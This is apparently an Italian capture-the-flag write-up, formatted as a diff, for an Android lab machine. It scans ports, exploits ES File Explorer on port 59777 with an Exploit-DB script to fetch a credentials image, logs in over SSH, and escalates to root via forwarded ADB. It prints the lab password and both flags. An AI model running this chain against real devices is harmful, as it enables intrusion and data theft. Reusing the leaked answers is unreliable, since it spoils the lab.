@@ -1,0 +1,42 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -Ap- -v 10.10.10.247
+
+Discovered open port 2222/tcp on 10.10.10.247
+Discovered open port 40001/tcp on 10.10.10.247
+Connect Scan Timing: About 47.64% done; ETC: 16:57 (0:00:34 remaining)
+Discovered open port 59777/tcp on 10.10.10.247
+Discovered open port 42135/tcp on 10.10.10.247
+
+---------------------------------------------------------------------------------------------------------------
+Cerchiamo qualche info sull'utilizzo che viene fatto di queste porte
+2222 -> SSH
+5555 -> Android Debug Bridge (ADB)
+59777 -> ES File Explorer File Manager application for Android
+42135 ->
+---------------------------------------------------------------------------------------------------------------
+Il servizio che gira sulla porta 59777 ha una vulnerabilità del 2019 che potrebbe essere sfruttata.
+https://www.exploit-db.com/exploits/50070
+---------------------------------------------------------------------------------------------------------------
+Testiamo un po' di opzioni di questo script. Al secondo tentativo, troviamo 4 immagini di cui una che si chiama creds.jpg
+Scarichiamo il file -> python3 exploit-script.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
+
+Effettivamente l'immagine sembra contenere delle credenziali. -> kristi:Kr1sT!5h@Rp3xPl0r3!
+---------------------------------------------------------------------------------------------------------------
+ssh kristi@10.10.10.249 ma non riusciamo ad accedere. Ed effettivamente, il servizio non gira sulla classica porta, quindi dobbiamo specificare.
+
+ssh kristi@10.10.10.249 -p 2222 -> ACCESSO OTTENUTO
+cd /home -> ls -la -> cat user.txt -> f32017174c7c7e8f50c6da52891ae250
+---------------------------------------------------------------------------------------------------------------
+Dato che abbiamo accesso alla macchina, utilizziamo ssh per il port forwarding e sfruttare ADB.
+ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555
+
+Installiamo adb sulla nostra macchina -> sudo apt-get install android-tools-adb 
+
+adb connect localhost:5555 -> 
+adb shell -> Ma riceviamo un errore "error: more than one device/emulator"
+
+Cerchiamo su internet -> adb -s localhost  shell
+
+Vediamo subito che utente siamo con whoami.
+Proviamo a fare subito un "su" e riesco ad ottenere i permessi di root. Spulcio un po' le cartelle e trovo la flag nella cartella data
+cat data/root.txt -> f04fc82b6d49b41c9b08982be59338c5
